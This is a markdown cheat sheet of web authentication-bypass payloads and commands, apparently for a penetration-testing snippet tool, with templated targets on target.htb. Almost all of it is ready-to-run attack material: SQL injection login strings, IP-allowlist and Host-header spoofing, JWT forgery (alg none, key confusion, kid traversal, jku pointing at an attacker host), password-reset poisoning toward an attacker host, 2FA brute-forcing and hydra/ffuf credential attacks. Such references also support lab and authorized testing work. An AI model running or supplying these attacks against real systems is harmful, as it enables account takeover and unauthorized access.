# Authentication Bypass

> Login + auth bypass tricks — header tricks, JWT, session, default creds, IDOR-adjacent, proxy

<!-- tags: auth, bypass, web, payload, jwt, session -->

---

## try default creds
Hammer the usual list before anything else.

```bash
echo -e "admin:admin\nadmin:password\nadmin:admin123\nroot:root\nroot:toor\nadministrator:password\nguest:guest\ntest:test\nuser:user"
```

<!-- meta: risk=safe | phase=enum | tags=auth,defaults -->

---

## bypass login sqli
Drop directly into auth bypass list.

```bash
echo -e "admin' or 1=1-- -\nadmin'#\n' or 0=0 #\nadmin' or '1'='1\n\" or \"\"=\"\nadmin'/*"
```

<!-- meta: risk=med | phase=exploit | tags=auth,sqli -->

---

## bypass auth verb tampering
Try different verbs against the auth endpoint.

```bash
for m in POST PUT GET HEAD OPTIONS DELETE PATCH TRACE CONNECT; do echo -n "$m: "; curl -s -o /dev/null -w "%{http_code}\n" -X $m {{URL:url:http://target.htb/admin}}; done
```

<!-- meta: risk=safe | phase=enum | tags=auth,verb,tampering -->

---

## bypass IP allowlist X-Forwarded-For
Bypass IP allowlists.

```bash
curl -s {{URL:url:http://target.htb/admin}} -H "X-Forwarded-For: 127.0.0.1"
curl -s {{URL:url:http://target.htb/admin}} -H "X-Real-IP: 127.0.0.1"
curl -s {{URL:url:http://target.htb/admin}} -H "X-Originating-IP: 127.0.0.1"
curl -s {{URL:url:http://target.htb/admin}} -H "X-Remote-IP: 127.0.0.1"
curl -s {{URL:url:http://target.htb/admin}} -H "X-Client-IP: 127.0.0.1"
curl -s {{URL:url:http://target.htb/admin}} -H "X-Host: localhost"
```

<!-- meta: risk=safe | phase=exploit | tags=auth,header,bypass -->

---

## bypass auth path confusion
Bypass via trailing chars / path normalization.

```bash
curl -s {{URL:url:http://target.htb}}/admin/
curl -s {{URL:url:http://target.htb}}/admin/.
curl -s {{URL:url:http://target.htb}}/admin..;/
curl -s {{URL:url:http://target.htb}}/admin%20
curl -s {{URL:url:http://target.htb}}/admin%09
curl -s {{URL:url:http://target.htb}}/Admin
curl -s {{URL:url:http://target.htb}}/ADMIN
curl -s {{URL:url:http://target.htb}}//admin//
```

<!-- meta: risk=safe | phase=exploit | tags=auth,path,bypass -->

---

## bypass auth host header override
Trick virtual host routing.

```bash
curl -s {{URL:url:http://target.htb/admin}} -H "Host: admin.target.htb"
curl -s {{URL:url:http://target.htb/admin}} -H "X-Forwarded-Host: admin.target.htb"
```

<!-- meta: risk=med | phase=exploit | tags=auth,host,bypass -->

---

## bypass auth referer trust
Some apps gate by Referer header.

```bash
curl -s {{URL:url:http://target.htb/admin}} -H "Referer: http://target.htb/admin/dashboard"
```

<!-- meta: risk=safe | phase=exploit | tags=auth,referer -->

---

## forge JWT none algorithm
Drop sig and set alg to none.

```bash
echo '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-'
echo '{"sub":"admin","role":"admin","iat":1700000000}' | base64 -w0 | tr -d '=' | tr '/+' '_-'
echo "<header_b64>.<payload_b64>."
```

<!-- meta: risk=high | phase=exploit | tags=auth,jwt,none -->

---

## crack JWT secret hs256
Brute-force HS256 JWT signing secret.

```bash
hashcat -m 16500 {{JWT:str:eyJhbGciOi...}} {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=auth,jwt,crack -->

---

## forge JWT algorithm confusion RS256 HS256
Use public key as HMAC secret.

```bash
python3 -c "
import jwt
with open('public.pem') as f: key=f.read()
print(jwt.encode({'sub':'admin','role':'admin'}, key, algorithm='HS256'))
"
```

<!-- meta: risk=high | phase=exploit | tags=auth,jwt,confusion -->

---

## inject JWT kid path traversal
Manipulate kid header for file inclusion.

```bash
echo '{"alg":"HS256","kid":"../../../../dev/null","typ":"JWT"}' | base64 -w0
```

<!-- meta: risk=high | phase=exploit | tags=auth,jwt,kid -->

---

## spoof JWT jku x5u
Point JKU to attacker JWKS.

```bash
echo '{"alg":"RS256","jku":"http://{{LHOST:ip}}:{{LPORT:port:8000}}/jwks.json","typ":"JWT"}' | base64 -w0
```

<!-- meta: risk=high | phase=exploit | tags=auth,jwt,jku -->

---

## test session fixation
Reuse same session ID before/after login.

```bash
curl -c /tmp/cj1 -s {{URL:url:http://target.htb/}}
curl -b /tmp/cj1 -c /tmp/cj1 -X POST -d "user={{USERNAME:str:admin}}&pass={{PASSWORD:str:pass}}" {{URL:url:http://target.htb/login}}
diff <(grep -E "PHPSESSID|JSESSIONID|session" /tmp/cj1) /tmp/cj1
```

<!-- meta: risk=safe | phase=vuln | tags=auth,session,fixation -->

---

## brute predictable reset token
Test if password reset/email tokens are predictable (timestamps, sequential).

```bash
for i in $(seq 1000 1100); do echo "Trying token=$i"; curl -s "{{URL:url:http://target.htb/reset?token=}}$i" | grep -i "valid"; done
```

<!-- meta: risk=med | phase=exploit | tags=auth,token,predictable -->

---

## exploit mass assignment privilege escalation
Add role/admin field to signup.

```bash
curl -X POST {{URL:url:http://target.htb/signup}} -H "Content-Type: application/json" -d '{"username":"{{USERNAME:str:pwn}}","password":"{{PASSWORD:str:pwn123}}","role":"admin","is_admin":true}'
```

<!-- meta: risk=high | phase=exploit | tags=auth,massassignment -->

---

## bypass auth response manipulation
Login then flip 401/403 to 200 in proxy.

```bash
echo "Burp -> Match-and-Replace: 'HTTP/1.1 401' -> 'HTTP/1.1 200', '\"isAdmin\":false' -> '\"isAdmin\":true'"
```

<!-- meta: risk=med | phase=exploit | tags=auth,burp,response -->

---

## bypass 2FA skip step
Try going directly to post-2FA endpoint after first factor.

```bash
curl -s -b /tmp/cj1 {{URL:url:http://target.htb/dashboard}}
```

<!-- meta: risk=med | phase=exploit | tags=auth,2fa,bypass -->

---

## bypass 2FA code reuse
Replay last OTP — server may not invalidate.

```bash
curl -X POST {{URL:url:http://target.htb/2fa/verify}} -d "code={{CODE:str:123456}}" -b /tmp/cj1
```

<!-- meta: risk=med | phase=exploit | tags=auth,2fa,reuse -->

---

## brute 2FA no lockout
6-digit code with no lockout.

```bash
for c in $(seq 0 999999); do code=$(printf "%06d" $c); resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST {{URL:url:http://target.htb/2fa/verify}} -d "code=$code" -b /tmp/cj1); [ "$resp" = "200" ] && echo "FOUND: $code" && break; done
```

<!-- meta: risk=high | phase=exploit | tags=auth,2fa,bruteforce -->

---

## poison password reset host header
Hijack reset link via Host header poisoning.

```bash
curl -X POST {{URL:url:http://target.htb/forgot}} -H "Host: {{LHOST:ip}}" -d "email={{EMAIL:str:victim@target.htb}}"
```

<!-- meta: risk=high | phase=exploit | tags=auth,reset,host -->

---

## exploit OAuth missing state
Test for missing state param.

```bash
echo "{{URL:url:http://target.htb/oauth/callback?code=}}<attacker_code>"
```

<!-- meta: risk=med | phase=exploit | tags=auth,oauth -->

---

## brute login hydra http form
Hydra against HTTP form login.

```bash
hydra -L {{USERLIST:wordlist:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

<!-- meta: risk=med | phase=passwords | tags=auth,bruteforce,hydra -->

---

## brute login ffuf
ffuf with status code filter.

```bash
ffuf -w {{USERLIST:wordlist:users.txt}}:U -w {{WORDLIST:wordlist:rockyou.txt}}:P -X POST -d "username=U&password=P" -H "Content-Type: application/x-www-form-urlencoded" -u {{URL:url:http://target.htb/login}} -fc 401
```

<!-- meta: risk=med | phase=passwords | tags=auth,bruteforce,ffuf -->
